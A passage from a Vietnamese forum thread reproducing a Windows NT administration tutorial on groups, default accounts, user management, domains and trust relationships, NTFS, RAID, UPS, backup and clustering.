vào các domain controllers và tắt chúng.<br/> --------------------------------------------------------------------------------<br/> <b>III. Nhóm tổng thể (Global group) </b><br/> Nếu một hệ thống Windows NT là một phần của một domain Advanced Server thì nhóm tổng thể của domain có thể được sử dụng trong hệ thống này. Nhóm tổng thể có thể được sử dụng tại tất cả các máy tính trong domain (các máy tính Windows NT, các Advanced Server, và các LAN Manager 2.x server). Nhóm tổng thể có thể trở thành thành viên (được cấp membership) trong các nhóm cục bộ và có thể được cấp quyền trong một hệ thống cụ thể.<br/> Nhóm tổng thể có thể sử dụng một cách tổng thể , không bị giới hạn ở nơi dữ liệu chứa nó.<br/> Một nhóm tổng thể có thể được tạo từ một thành viên trong nhóm cục bộ của bất cứ máy tính nào trong domain hay domain được tin cậy.<br/> Chỉ nên sử dụng nhóm tổng thể khi các người dùng thành viên tương đương, ít tính quản trị trên tất cả các máyWindows Windows NT.<br/> Domain Windows NT Server chứa sẵn các nhóm tổng thể như:<br/> - Domain Admins: Nhóm các account bạn muốn là Administrators, và account Administrator cũng nằm trong Domain Admin<br/> - Domain Users: Các account trong domain<br/> - Domain Guest: Các account cho "khách" (Guest)<br/><br/> Các nhóm tổng thể không có đặc quyền thừa kế. Nó nhận được uỷ quyền do là thành viên trong nhóm cục bộ. Ví dụ trong một domain controllers nhóm Domain Administrators không tự nó có quyền hạn. Nó nhận được quyền vì nó là thành viên trong nhóm cục bộ Administrators trong domain controllers. Đó là tại sao các thành viên trong Domain Administrators có khả năng quản trị domain. Tương tự các nhóm Domain Users là thành viên trong nhóm cục bộ Users, và nhóm Domain Guests là thành viên trong nhóm cục bộ Guests.<br/><br/> Chú ý: Dùng chương trình User Manager for Domains, từ menu User, chọn New Global Group để quản lý các tài nguyên.<br/><br/> Các chiến lược về sử dụng nhóm<br/> Quán triệt cách tổng thể cho các người dùng và nhóm đó là gán các account người dùng của domain vào nhóm tổng thể của domain, đưa các nhóm tổng thể của domain làm thành viên của nhóm cục bộ, sau đó gán quyền và các tài nguyên cho nhóm cục bộ.<br/> Chiến lược khi làm trong môi trường nhiều domain kết nối bởi quan hệ tin cậy-relationships, cũng với cách trên. Với các account domain của bạn, nhóm các người dùng vào nhóm tổng thể. Nhóm tổng thể này sau đó được gán thành thành viên trong nhóm cục bộ không phải của domain này mà domain tin cậy nó (trusting).<br/> --------------------------------------------------------------------------------<br/> <b>IV. Các account nhóm mặc định </b><br/> Có năm nhóm mặc định trong Windows NT - Users, Power Users, Administrators, Backup Operators, và Guests.<br/><br/> 1. Users<br/><br/> Bất kỳ ai sử dụng máy tính thường xuyên có thể có một account trong nhóm Users. Nhóm Users cung cấp cho người dùng quyền cần thiết để thao tác trên hệ thống như một người dùng cuối, chẳng hạn như chạy các ứng dụng và quản lý các file.<br/> Một người dùng đăng ký làm việc vào một hệ thống Windows NT như một phần của nhóm Users có thể thực hiện những công việc sau:<br/> - Chạy các ứng dụng.<br/> - Quản lý các file.<br/> - Tạo và quản lý các nhóm.<br/> - Giữ một hồ sơ cá nhân.<br/> - Nối với một máy tính thông qua mạng.<br/><br/> 2. Power Users<br/><br/> Nhóm Power User cung cấp cho người dùng khả năng thực hiện các chức năng quản trị hệ thống mà không cho phép ngưoừi dùng hoàn toàn kiểm soát hệ thống.<br/> Bổ sung thêm vào tất cả các quyền được cung cấp cho nhóm Users, một người dùng login vào Windows NT nhưng thành viên của nhóm Power User có thể thực hiện các công việc sau đây:<br/> - Chia sẻ các thư mục trên mạng.<br/> - Cài đặt, chia sẻ và quản lý máy in.<br/> - Tạo các account người dùng.<br/> - Sửa đổi và xoá account người dùng mà họ đã tạo.<br/> - Thiết lập đồng hồ bên trong máy tính.<br/><br/> 3. Administrators<br/><br/> Nhóm Administrators cung cấp cho người dùng khả năng kiểm soát toàn bộ hệ thống.<br/> Bổ sung thêm vào tất cả các quyền cung cấp cho Power Users, một người dùng login vào Windows NT như là thành viên của nhóm Administrators có thể thực hiện các công việc sau đây:<br/> - Sửa đổi, và xoá account người dùng và nhóm được tạo bởi những người khác.<br/> - Gán account người dùng cho các nhóm mặc định.<br/> - Ghi đè lên khoá trạm làm việc.<br/> - Đặt khuôn dạng hoặc đặt partition cho một đĩa cứng.<br/> - Gán quyền người dùng.<br/> - Kiểm soát ghi nhật ký kiểm tra hệ thống.<br/> - Lưu trữ và khôi phục toàn bộ hệ thống.<br/> - Gỡ rối hệ thống.<br/> - Lấy quyền chủ sở hữu của các file và các đối tượng khác.<br/><br/> 4. Thao tác viên dự phòng (Backup Operators)<br/><br/> Nhóm Backup Operators cho phép người dùng lưu trữ và khôi phục các file trên hệ thống.<br/> Bất kỳ người sử dụng nào cũng có thể lưu trữ và khôi phục các file mà họ có quyền thâm nhập tương ứng. Nhóm Backup Operators phủ lên các quyền đó và cho phép người dùng có thể lưu trữ bất kỳ và tất cả các file trên đĩa, không xét đến quyền thâm nhập file.<br/><br/> 5. Guest<br/><br/> Trong quá trình cài đặt, Windows NT thiết lập account Guest mặc định. Account này cho phép bất kỳ ai không co account trong hệ thống khả năng login vào máy tính học nối vào thông qua mạng.<br/> Cần thiết phải có account Guest vì nhiều kiểu phần mềm mạng truy nhập máy tính thông qua account Guest.<br/> Bất kỳ ai trên một mạng có thể nối tới các tài nguyên chia sẻ trên máy tính của bạn thông qua account Guest, do vậy bạn cần gán quyền người dùng trên các tài nguyên chia sẻ của bạn để kiểm soát cách người dùng có thể thâm nhập các tài nguyên đó.<br/> Để một người dùng nào truy nhập vào mạng như một người dùng với account Guest thì đưa người dùng đó vào nhóm Guest.<br/> --------------------------------------------------------------------------------<br/> <b>V. Thiết lập các nhóm </b><br/> 1. Tạo các nhóm cục bộ (Local Groups)<br/><br/> Đầu tiên bạn phải tạo một nhóm cục bộ trước khi gán quyền tại trạm làm việc của nó. Những quyền này có thể cho phép chẳng hạn như truy nhập tới các file hoặc máy in như được thiết lập trên File Manager (Windows Exploror đối với Windows NT 4.0)và Print Manager một cách tương ứng.<br/><br/> 2. Để thêm một nhóm cục bộ<br/><br/> - Chọn một hoặc nhiều account người dùng.<br/> - Từ menu User, chọn New Local Group.<br/><br/> 3. Bổ sung các thành viên mới<br/><br/> a. Từ hộp hội thoại New Local Group, chọn nút Add. Hộp hội thoại Add liệt kê tất cả các account của người sử dụng trong máy tính.<br/> b. Tuỳ ý chọn một tên domain trong hộp List Names In. Chọn domain xong, account người sử dụng và nhóm tổng thể (global groups) của domain sẽ được liệt kê.<br/> c. Chọn một vài account người dùng và nhóm global từ hộp Name.<br/><br/> 4. Chép một nhóm tổng thể (global groups)<br/><br/> a. Chọn một nhóm trong danh sách các nhóm.<br/> b. Chọn menu User, chọn Copy.<br/> Trong hộp hội thoại New Local Group, tên nhóm có màu trắng. Thông tin mô tả và các account các thành viên nhóm được sao chép.<br/><br/> 5. Xoá nhóm<br/><br/> Xoá nhóm cục bộ chỉ có nghĩa là bỏ nhóm cục bộ đó thôi — Nó không xoá bất kỳ account người dùng hay nhóm tổng thể mà nó là thành viên của nhóm cục bộ bị xoá. Khi xoá một nhóm sẽ có một cảnh báo chỉ cho người sử dụng rằng nếu tạo nhóm mới có cùng tên với tên nhóm xoá sẽ không phục hồi các quyền hạn trước kia.<br/> Khi một nhóm được xoá và bạn lại tạo một nhóm mới có tên giống tên nhóm vừa xoá, nhóm mới sẽ không có bất cứ quyền truy nhập gì như lúc trước đối với nhóm bị xoá vì nhóm mới sẽ có một SID. Tất cả các quyền, các quyền gán và các thành viên của nhóm mới cần được thiết lập theo cách thức thông thường.<br/> --------------------------------------------------------------------------------<br/> <b>VI. Account người dùng mặc định </b><br/> Ba account mặc định, Administrator, Guest và một người dùng khởi đầu được tạo khi Windows NT được cài đặt lần đầu tiên. Mỗi account mặc định có một số quyền hạn nhất định trên hệ thống.<br/><br/> 1. Administrator<br/><br/> Account Administrator được tạo trong quá trình cài đặt hệ thống. Yêu cầu một mật khẩu ban đầu khi cài đặt. Đặc điểm của account này là có thể đổi tên nhưng không thể xoá được.<br/> Administrator có quyền cao nhất trên toàn bộ hoạt động và an toàn của hệ thống. Administrator thậm chí có quyền kiểm soát các file của các người dùng khác. Bất kỳ ai biết tên sử dụng và mật khẩu của Administrator có quyền cao nhất về quản trị toàn bộ hệ thống .<br/> Nếu mật khẩu bị quên hoặc không biết thì cách duy nhất là cài đặt lại Windows NT hoặc sử dụng sử dụng đĩa Sửa chữa Khẩn cấp (Emergency Repair disk) được tạo trong quá trình cài đặt. Để tránh tình trạng account Administrator trở nên không hữu ích hoặc không tích cực, các người dùng bổ sung có thể được gán các quyền của Administrator.<br/> Một người dùng đăng ký sử dụng dưới account Administrator (hoặc một account thuộc về nhóm Administrator) có thể thực hiện các công việc sau:<br/> - Sửa hoặc xoá các account người dùng hoặc nhóm<br/> - Bổ sung hoặc loại bỏ người dùng khỏi nhóm<br/> - Gán các quyền đặc biệt cho nhóm<br/> - Sửa đổi phần mềm hệ thống điều hành<br/> - Cài đặt hoặc nâng cấp phần mềm ứng dụng và điều khiển thiết bị<br/> - Lên khuôn dạng đĩa cứng<br/> - Thiết lập máy tính để quản trị mạng từ xa<br/><br/> 2. Người sử dụng ban đầu<br/><br/> Trong quá trình cài đặt một account người dùng ban đầu được tạo cho cá nhân cài đặt Windows NT. Account này cũng được cấp quyền như Administrator. Tên của account này được thiết lập trong quá trình cài đặt.<br/><br/> 3. Guest<br/><br/> Account Guest được sử dụng một cách mặc định cho bất kỳ ai sử dụng mà không có account người dùng hoặc Administrator. Account Guest có rất bị hạn chế trong việc truy nhập vào tài nguyên của máy tính.<br/> Guest bị từ chối truy nhập vào bất cứ một thư mục hoặc file nào được sử dụng cá nhân. Người quản trị có trách nhiệm thiết lập bảo mật thư mục và file để hạn chế Guest không được truy nhập các thư mục và file riêng trên hệ thống. Nếu các quyền của Guest được cho phép trên hệ thống, người quản trị cần thiết lập một thư mục chung để lưu các file mà Guest có thể truy nhập được.<br/> Trong một số trường hợp, máy chủ cần được giới hạn triệt để sao cho chỉ có một số người dùng nhất định có thể truy nhập vào đó. Để hạn chế Guest ngay cả trong việc sử dụng các tài nguyên hạn chế bạn có thể hoặc là không cho phép (disable) account Guest hoặc gán một mật khẩu cho account Guest.<br/> --------------------------------------------------------------------------------<br/> <b>VII. Thiết lập các account người dùng </b><br/> Tiện ích User Manager trong nhóm Adminitrative Tools được sử dụng để thiết lập các account người dùng.<br/> 1. Tạo account người dùng<br/><br/> Từ menu User, chọn New User.<br/> Trong box Username, gõ một tên người dùng duy nhất trong hệ thống, chiều dài tối đa 20 ký tự.<br/> a. Trong box Full Name, gõ tên hoàn chỉnh của người dùng.<br/> b. Nếu cần, nhập dữ liệu vào hộp mô tả.<br/> c. Gõ Password và Confirm Password giống nhau. Mật khẩu tối đa là 14 ký tự, phân biệt chữ hoa chữ thường, trong khi tên thì không.<br/> d. Lựa chọn tuỳ chọn.<br/> e. Để quản trị thuộc tính của người dùng đi kèm với các nút bấm (đặt tại đáy của hộp hội thoại), lựa chọn nút thuộc tính, hoàn thiện hộp đối thoại cho thuộc tính đó và chọn nút OK.<br/> f. Chọn nút OK để bổ sung account.<br/><br/> 2. Các tuỳ chọn New User<br/><br/> Các tuỳ chọn New User có thể được lựa chọn là:<br/> - Người sử dụng phải thay đổi mật khẩu tại lần đăng ký sử dụng tiếp theo<br/> - Người dùng không thể đổi mật khẩu<br/> - Account bị không cho phép<br/> - Mật khẩu không bao giờ quá hạn<br/> Các account không được phép không thể được sử dụng. Các account không cho phép thông thường được sử dụng như một cái khung để copy khi tạo account mới hoặc được sử dụng để tạo một account sẽ được kích hoạt về sau.<br/><br/> 3. Đổi tên account người dùng<br/><br/> Có thể đổi tên bất kỳ account người dùng nào, bao gồm các account mặc định. Tuy nhiên, chỉ có một account có thể đổi tên một lúc. Khi một account bị đổi tên, nó vẫn duy trì tất cả các thuộc tính còn lại. Điều duy nhất thay đổi là tên của account.<br/><br/> 4. Lập bản sao account người dùng<br/><br/> Có thể copy một account người dùng đã được cấu hình tới một account mới bằng cách lựa chọn account cần copy và chọn User, Copy.<br/> Các mục được copy trực tiếp từ một account người dùng hiện tại tới một account người dùng mới là mô tả và nhóm. Các hồ sơ được copy có điều kiện.<br/> Windows NT tự động xoá các mục Username, Full Name, Password, Confirm Password, User Cannot Change Password, Account Disabled, và Password Never Expires. Nó cũng chọn mục "User Must Change Password At Next Logon".<br/><br/> 5. Xoá account người dùng<br/><br/> Một khi một account người dùng đã bị xoá nó không thể được khôi phục lại bởi vì định danh duy nhâts cho account đó không còn tồn tại nữa. Một account mới được tạo với cùng tên sẽ có một định danh khác và như vậy sẽ không thể thâm nhập bất kỳ mục nào mà account cũ có quyền thâm nhập. Account mới phải có cùng quyền, thành viên nhóm và các thuộc tính khác được thiết lập cho nó để nó lại như cũ.<br/> Để xoá một hay nhiều account người dùng:<br/> a. Chọn một hoặc nhiều account người dùng.Từ menu User chọn Delete.<br/> b. Nếu một thông báo khẳng định xuất hiện, chọn nút OK.<br/> c. Khi thông báo Delete xuất hiện, chọn Yes.<br/> Nếu nhiều account người dùng được lựa chọn, chọn Yes To All.<br/><br/> 6. Không cho phép account người dùng<br/><br/> Vì các account mới được tạo cùng tên với một account đã từng tồn tại từ trước có định danh khác account cũ nên nói chung account người dùng nên được không cho phép trong một thời gian trước khi bị xoá để đảm bảo rằng account thật sự cần thiết bị xoá. Không cho phép một account ngăn chặn việc logon vào Windows NT, tất cả các thông tin account vẫn giữ nguyên không thay đổi. Để không cho phép một hoặc nhiều account:<br/> a. Chọn account cần không cho phép.Từ menu User, chọn Properties.<br/> b. Chọn hộp Account Disabled.<br/> c. Nhấn OK.<br/> --------------------------------------------------------------------------------<br/> <b>VIII. Thiết lập Hồ sơ Môi trường Người dùng </b><br/> 1. Hồ sơ người dùng<br/> Windows NT lưu trữ một bản lưu tất cả các thông tin cấu hình của desktop của người dùng trong một hồ sơ người dùng cục bộ. Thông tin hồ sơ được lưu trữ khi một người dùng thoát ra và được tự động khôi phục lại khi người dùng trở lại làm việc vào trạm làm việc. Các thiết lập sau được lưu trữ trong một hồ sơ người dùng:<br/> - Program Manager (Desktop đối với Windows NT 4.0 )<br/> - File Manager (Windows Explorer đối với Windows NT 4.0)<br/> - Dòng lệnh MS-DOS<br/> - Print Manager<br/> - Các tuỳ chọn Control Panel<br/> - Các tuỳ chọn Accessory<br/> - Các ứng dụng Windows NT của tổ chức thứ ba.<br/> - Các bookmark của On-line Help<br/> Các hồ sơ đảm bảo rằng mỗi người dùng luôn luôn có sở thích riêng của mình trên trạm làm việc khi họ đăng ký làm việc vào Windows NT hoặc Advanced Server. Các hồ sơ không ảnh hưởng gì đối với các người dùng MS-DOS và Windows for Workgroups.<br/> Các trạm làm việc Windows NT Workgroup tự động tạo các hồ sơ dựa trên cục bộ (local-based). Khi một người dùng thoát ra, thông tin hồ sơ được lưu trữ trong đăng ký (registry). Khi người dùng đó đăng ký làm việc lại, trạm làm việc sẽ nhận ra người dùng và nạp hồ sơ tương ứng. Các hồ sơ cục bộ phụ thuộc vào máy tính: các thiết lập dựa trên một máy tính là không áp dụng được khi người dùng đăng ký làm việc tại một trạm làm việc khác.<br/> Đối với trạm làm việc Windows NT domain và Advanced Servers, các hồ sơ có thể được lưu trữ trong file riêng biệt và như vậy được nạp tới bất kỳ máy nào trong mạng.<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/478.html#478,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><b>XIV. Phương thức bảo vệ trên mạng </b><br/> Cơ sở của sự bảo vệ và quản trị tập trung trong môi trường Windows NT Advanced Server là domain. Một domain là một nhóm các Servers cài đặt hệ điều hành Windows NT Advanced Server chứa cùng một tập hợp các User accounts. Do vậy thông tin về một User mới chỉ cần nhập tại một Server bất kỳ nhưng đều cho phép các Servers khác trong domain nhận ra.<br/> Trust Relationship nối các domains với nhau, cho phép pass-through authentication. Điều này có nghĩa là người sử dụng chỉ cần có account trong một domain có thể truy cập tới các thực thể trên toàn mạng.<br/><br/> 1. Domains : Đơn vị quản trị cơ bản<br/><br/> Việc nhóm các máy tính vào các domains đem lại hai cái lợi chính cho người quản trị mạng và người sử dụng. Cái quan trọng nhất đó là tất cả các Servers trong một domain được xem như là một đơn vị quản trị đơn chia sẻ khả năng bảo vệ và thông tin về người sử dụng. Mỗi một domain có một cơ sở dữ liệu (database) lưu trữ thông tin về User account. Mỗi một Server trong domain lưu trữ một bản copy database. Do đó Windows NT Advanced Server tiết kiệm cho người quản trị mạng cũng như người sử dụng thời gian và đem lại các kết quả thích đáng. Cái lợi thứ hai đó chính là sử thuận tiện cho người sử dụng.<br/><br/> 2. Trust Relationship : nối giữa các domains<br/><br/> Bằng cách thiết lập Trust Relationship nối giữa các domains trên mạng với nhau cho phép các User accounts và global group được sử dụng trên nhiều domains thay vì chỉ trên một domain. Khả năng này làm cho công việc của người quản trị mạng trở nên dễ dàng hơn, họ chỉ cần tạo account cho người sử dụng trên một domain song vẫn có thể truy cập tới các máy tính của các domains khác chứ không riêng gì các máy tính trong cùng một domain.<br/> Việc thiết lập Trust Relationship có thể theo một chiều hoặc hai chiều. Trust Relationship hai chiều là một cặp của Trust Relationship một chiều, ở đó mỗi domain tin tưởng vào domain khác.<br/><br/> 3. Hoạt động của domain<br/><br/> Yêu cầu tối thiểu cho một domain là phải có domain controller và lưu trữ bản copy chính (master copy) của User và group database. Tất cả các thông tin thay đổi trong database này phải được thực hiện trên domain controller, tức là bất cứ sự thay đổi User database trên một Server nào trong domain sẽ được tự động cập nhật lại trong domain controller. Domain account database được sao lưu trên tất cả các Server cài đặt Windows NT Advaced Server. Cứ 5 phút một lần các Servers lại gửi query lên domain controller hỏi xem có sự thay đổi gì không. Nếu có sự thay đổi, domain cntroller gửi thông tin bị thay đổi (chỉ có thông tin bị thay đổi mới được gửi) tới các Servers trong domain. Để đảm bảo hệ thống hoạt động liên tục, cách tốt nhất là tạo thêm backup domain controller cho domain controller chính.<br/><br/> 4. Các kiểu domain<br/><br/> Có bốn kiểu domains được đưa ra để tổ chức hệ thống mạng đó là single domain, master domain, multiple master domain, complete trust domain.<br/><br/> Single domain<br/> Nếu như hệ thống mạng không có quá nhiều User do đó không cần phải chia nhỏ việc tổ chức bằng các sử dụng kiểu domain đơn giản nhất đó là simple domain. Mạng máy tính khi đó chỉ có một domain duy nhất và không cần đặt Trust Relationship. Mô hình này không phức tạp rất phù hợp đối với mạng có quy mô nhỏ.<br/> Master domain<br/> Trong trường hợp phải phân chia mạng thành các domains cho những mục đích khác nhau song quy mô của mạng lại đủ nhỏ thì lựa chọn tốt nhất là sử dụng master domain. Mô hình này cho phép quản lý tập trung nhiều domains. Trong mạng sử dụng master domain cần có một master domain trong đó tạo tất cả Users và global groups. Tất cả các domains khác trên mạng phải "trust" vào master domain này và như vậy có thể sử dụng Users và global groups được tạo ra như trên đã nói. Có thể hiểu rằng master domain là một accounts domain, với mục đích chính là quản lý các User accounts của mạng, các domain còn lại được xem như là các domain tài nguyên tức là không lưu trữ các User accounts mà đơn giản chỉ cung cấp các tài nguyên.<br/> Multiple master domain<br/> Đối với một quy mô lớn hơn, rộng hơn kiểu master domain không thể đáp ứng được khi đó có thể cách tốt nhất là sử dụng Multiple Master Domain. Mô hình này bao gồm một số (đủ nhỏ) các master domains, mọi User accounts được tạo ra trên một master domain trong số các master domains trên mạng. Các domain khác không phải là master domain (gọi là các department domain) sẽ là các domain tài nguyên. Mỗi một master domain cần phải "trust" vào tất cả các master domains khác. Mọi department domain khi đã "trust" vào một master domain sẽ "trusts" tất cả các master domains khác. Nhược điểm chính của mô hình này là đòi hỏi nhiều sự quản lý Trust Relationship.<br/> Complete trust domain<br/> Trong trường hợp yêu cầu phải quản lý các domains phân tán trên các departments thì mô hình Complete Trust Domain là rất phù hợp. Với Complete trust domain, mỗi một domain "trust" vào domain khác, tức là mỗi một domain có một Users và global groups riêng của mình nhưng các Users và global groups này vẫn có thể được sử dụng trên các domain khác trong mạng. Như vậy giả sử có n domains trên mạng sẽ có n*(n-1) Trust Relationship.<br/> -------------------------------------------------------------------------------<br/> <b>XV. Quản trị môi trường người sử dụng </b><br/> Trong hệ điều hành mạng Windows NT Advanced Server có nhiều cách để quản lý môi trường người sử dụng. Phương pháp được sử dụng nhiều nhất để quản lý môi trường người sử dụng đó là thông qua các User profiles. Một profile là một tệp phục vụ như một bản chụp nhanh của môi trường làm việc hiện thời của người sử dụng (User desktop environment). Với các profiles có thể hạn chế khả năng của người sử dụng, thay đổi các tham số được đặt tại trạm làm việc riêng của họ. Phương pháp thứ hai để quản lý đó là sử dụng lập các logon scripts cho các Users. Nếu mỗi một User có một logon script thì có nghĩa là script sẽ được chạy bất cứ khi nào User này logon vào hệ thống tại bất cứ trạm làm việc nào trên mạng. Script có thể là một tệp tin dạng lô (batch file) chứa đựng các câu lệnh của hệ điều hành hoặc các chương trình chạy. Cách khác có thể cung cấp cho mỗi người sử dụng một thư mục riêng (home directory) trên Server hay tại Workstation. Một home directory của một User là một vùng lưu trữ riêng của người sử dụng này và họ có toàn quyền trên đó. Ngoài ra có thể đặt các biến môi trường cho mỗi trạm làm việc. Các biến môi trường này xác định sự tìm kiếm đường dẫn của trạm làm việc, thư mục, các tệp tạm thời hay các thông tin tương tự khác.<br/> --------------------------------------------------------------------------------<br/> <b>XVI. Quản lý hệ thống tệp trên mạng </b><br/> Một vấn đề quan trọng khi sử dụng các Servers trên mạng là sự chia sẻ các tệp tin và các thư mục. Hệ điều hành Windows NT Advanced Server cung cấp khả năng xử lý cao, an toàn và bảo mật cho các tệp tin được chia sẻ nhất là khi sử dụng cấu trúc hệ thống tệp NTFS (Windows NT File System). Phân quyền truy cập các tệp tin và thư mục trên ổ đĩa NTFS đảm bảo rằng chỉ có những người sử dụng thích hợp mới có khả năng truy cập theo quyền hạn được phân ở các mức khác nhau. Với Windows NT Advanced Server các tệp tin và các thư mục trên ổ đĩa NTFS chịu sự kiểm tra kỹ càng. Một khái niệm khác được nhắc tới ở đây đó là file ownership, mỗi một tệp tin và thư mục đều có một người chủ có thể điều khiển nó tất cả các người khác muốn truy cập đều phải được sự cho phép của người chủ này. Windows NT Advanced Server cung cấp chức năng sao lưu thư mục. Với dịch vụ Replicator, có thể duy trì bản sao của hệ thống tệp hiện thời phục vụ khi có sự cố xảy ra đối với hệ thống tệp chính.<br/> --------------------------------------------------------------------------------<br/> <b>XVII. An toàn dữ liệu </b><br/> 1. Quản lý khôi phục sự cố<br/> Fault tolerance là khả năng đảm bảo cho hệ thống tiếp tục thực hiện chức năng của mình khi một phần gặp sự cố. Thông thường khái niệm Fault tolerance được nhắc tới nhằm mô tả hệ thống đĩa lưu trữ (disk subsystems) song nhìn một cách tổng thể nó còn được ứng dụng cho các phần, thực thể khác của hệ thống. Một cách đầy đủ hệ thống Fault tolerance bao gồm disk subsystems, nguồn cung cấp và hệ thống các bộ điều khiển đĩa dư thừa (redundant disk controllers).<br/><br/> 2. Tìm hiểu về RAID<br/><br/> Hệ thống Fault tolerance ổ đĩa được chuẩn hoá bao gồm sáu mức từ 0 đến 5 được biết đến như là Redundant Arrays of Inexpensive Disks (RAID). Mỗi một mức là sự kết hợp của khả năng xử lý, an toàn và giá thành.<br/> Mức 0<br/> Thông thường được biết đến là disk striping và sử dụng hệ thống tệp tin gọi là stripe set. Dữ liệu được chia thành các khối và được trải khắp trên các đĩa cố định (fixed disk) theo một thứ tự định trước.<br/> Mức 1<br/> Được biết đến là disk mirroring sử dụng hệ thống tệp tin gọi là mirror set. Tất cả dữ liệu được ghi trên đĩa thứ nhất đều được ghi lại giống hệt trên đĩa thứ hai. Do vậy chỉ sử dụng được 50 phần trăm dung lượng lưu trữ. Khi một đĩa gặp sự cố, dữ liệu sẽ được lấy từ đĩa còn lại.<br/> Mức 2<br/> Phương pháp sử dụng thêm mã error-correcting. RAID mức 2 chia các tệp tin thành các bytes trải khắp trên nhiều đĩa. Phương pháp error-correcting yêu cầu tất cả các các đĩa đều phải lưu thông tin error-correcting.<br/> Mức 3<br/> Tương tự như mức 2, nhưng chỉ yêu cầu một đĩa để lưu trữ dữ liệu parity (thông tin error-correcting).<br/> Mức 4<br/> Xử lý dữ liệu với kích cỡ của các khối (blocks) và các đoạn (segments) lớn hơn so với mức 2 và mức 3. Nó lưu trữ thông tin error-correcting trên một đĩa tách rời dữ liệu của người sử dụng.<br/> Mức 5<br/> Được biết đến với cái tên striping and parity. Đây là loại thông dụng. RAID 5 tương tự như RAID 4 nhưng thông tin parity được ghi không phải chỉ trên một đĩa mà là trên tất cả các đĩa. Điều đó có nghĩa là có hai loại thông tin trên một đĩa.<br/><br/> 3. Quản lý UPS (Uninterrupt Power Supplies)<br/><br/> Có hai cách thức sử dụng UPS là online và standby.<br/> Online : Sử dụng online UPS kết nối trung gian giữa máy tính và nguồn điện, khi đó UPS trở thành đơn vị cung cấp nguồn chính.<br/> Standby : UPS được sử dụng nối giữa máy tính và nguồn cung cấp, song UPS được sử dụng ở trạng thái chờ đợi sẵn sàng hoạt động bất cứ khi nào có sự cố về nguồn.<br/> Windows NT Advanced Server sử dụng UPS service để theo dõi trạng thái của UPS cung cấp các thông tin đầy đủ của UPS cho người quản trị mạng.<br/> --------------------------------------------------------------------------------<br/> <b>XVIII. Hệ sao lưu dữ liệu </b><br/> Windows NT Advanced Server cung cấp tiện ích tape backup, cho phép sao lưu dữ liệu tập trung tất cả các ổ đĩa của các máy tính trên mạng chạy trên các hệ điều hành khác nhau từ Microsoft LAN Manager 2.x, Windows NT Workstation, Windows for Workgroup đến các máy chủ được cài đặt Windows NT Advanced Server khác.<br/> --------------------------------------------------------------------------------<br/> <b>XIX. Clustering </b><br/> 1. So sánh với Fault Tolerant<br/><br/> Ưu điểm của Cluster so với Fault Tolerant là ở chỗ trong khi Fault Tolerant xây dựng khả năng làm việc với mức độ cao của thiết bị chính thì thiết bị backup lại ở trạng thái chờ (idle) chỉ bắt đầu hoạt động khi thiết bị chính gặp lỗi. Đối với Cluster không như vậy, trong khi hệ thống chính vấn thực hiện với mức độ cao thì hệ thống backup cũng thực hiện song song đồng thời kết hợp với hệ thống chính cùng chia sẻ tài nguyên Cluster.<br/> Windows NT Cluster là một giải pháp phần mềm phù hợp với giá mà người sử dụng phải trả để có được một hệ thống có khả năng thay đổi dễ dàng mềm dẻo đồng thời đảm bảo được sự ổn định an toàn của hệ thống.<br/><br/> 2. Giới thiệu kỹ thuật<br/><br/> Các ứng dụng Cluster được xây dựng theo mô hình Client/Server, luồng công việc được chia thành các đơn vị nhỏ được thực hiện trên các máy khác nhau.<br/> Windows NT Cluster được thiết kế tương thích với các chuẩn được xây dựng từ trước trong Windows NT, các tiện ích quản trị mạng không cần phải có sự thay đổi nào khi hoạt động trên hệ thống Windows NT.<br/><br/> 3. Mô hình phần cứng<br/><br/> NT Cluster được thiết kế theo chuẩn công nghiệp các vi xử lý có thể là Intel hoặc RISC, các kỹ thuật mạng cục bộ thông dụng, các giao thức giao vận như IPX/SPX, TCP?IP, xây dựng theo phương pháp Module hoá dễ dàng mở rộng phát triển. Windows NT Cluster được xây dựng điều khiển tập trung nhằm cung cấp kỹ thuật cluster mang lại nhiều tiện lợi nhất. Mục đích của việc thiết kế này là nhằm đưa ra một sản phẩm bao hàm tất cả các khía cạnh xu hướng phát triển của phần cứng bao gồm các vi xử lý, kết nối giữa các hệ thống lưu trữ. Tất cả các vi xử lý trong hệ Cluster đều phải chạy hệ điều hành Windows NT, hiện tại hệ Cluster chỉ support cho hệ thống trong đó các máy chủ phải có dòng vi xử lý giống nhau. Trong tương lai việc hoà trộn các loại máy chủ trong cùng một hệ thống là một mục tiêu quan trọng. Có hai kiểu kết nối trong Windows NT Cluster là kết nối Processor-to-Processor và kết nối Processor-to-Storage.<br/> Với kết nối Processor-to-Processor, Windows NT sử dụng phương thức giao vận nội tại trong hệ điều hành để thực hiện việc liên lạc như giao thức TCP/IP, IPX/SPX. Các giao thức này hoạt động được trên các chuẩn mạng như Ethernet, FDDI, ATM, Token Ring ..v..v..<br/><br/> 4. Mô hình phần mềm<br/><br/> Windows NT Cluster được xây dựng theo mô hình Client/Server phân rã về mặt chức năng các ứng dụng hoặc giải pháp giữa các hệ thống. Windows NT Cluster đòi hỏi một client User interface phải khởi tạo một phép xử lý hoặc một dịch vụ được cung cấp bởi một hay nhiều máy chủ trong hệ thống. Với Windows NT Cluster, kiểu Partitioned data được thiết kế trong đó luồng công việc thực hiện chung được chia nhỏ thành các segments, mỗi segment sẽ được điều khiển cục bộ tại một nhân tố tạo thành hệ cluster. Kiểu Shared data lại hoạt động theo nguyên tắc khác. Luồng công việc vẫn nguyên khối không bị chia nhỏ mà hoạt động trên toàn bộ hệ thống với việc lập biểu điều khiển thực hiện phân tán. Windows NT Cluster ngoài ra còn cung cấp các APIs cho phép xây dựng các ứng dụng trên hệ cluster trong cả hai chế độ của Windows NT là User mode và kernel mode. Windows NT là giải pháp server-oriented, client không cần biết tới có bao nhiêu nhân tố tạo thành hệ cluster. Client sẽ làm việc với 